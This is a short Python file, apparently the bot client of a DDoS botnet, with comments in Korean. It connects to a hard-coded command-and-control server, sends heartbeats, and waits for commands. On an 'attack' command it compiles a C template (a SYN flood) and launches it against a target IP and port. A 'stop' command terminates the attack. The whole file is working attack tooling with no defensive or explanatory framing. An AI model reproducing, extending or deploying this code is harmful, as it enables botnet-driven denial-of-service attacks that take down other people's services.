# bot_client.py
import socket, threading, time, subprocess, os

CNC_IP = '192.168.0.100'
CNC_PORT = 9001

current_process = None  # 공격 서브프로세스를 추적

def connect_to_cnc():
    global current_process

    while True:
        try:
            sock = socket.socket()
            sock.connect((CNC_IP, CNC_PORT))
            ip = sock.getsockname()[0]
            sock.send(f"hello {ip}".encode())

            threading.Thread(target=heartbeat, args=(sock,), daemon=True).start()

            while True:
                data = sock.recv(1024).decode().strip()
                if data.startswith("attack"):
                    _, method, ip, port = data.split()
                    with open("bot_attack.c", "w") as f:
                        f.write(get_c_source_code(method))
                    subprocess.run(["gcc", "bot_attack.c", "-o", "attack_exec"])
                    current_process = subprocess.Popen(["./attack_exec", ip, port])
                elif data == "stop":
                    if current_process:
                        current_process.terminate()
                        sock.send(b"done stop")
                        current_process = None

        except Exception as e:
            time.sleep(5)

def heartbeat(sock):
    while True:
        try:
            sock.send(b"heartbeat")
        except:
            break
        time.sleep(3)

def get_c_source_code(method):
    if method == "syn":
        return open("templates/syn.c").read()
    return "// unknown attack"

if __name__ == "__main__":
    connect_to_cnc()
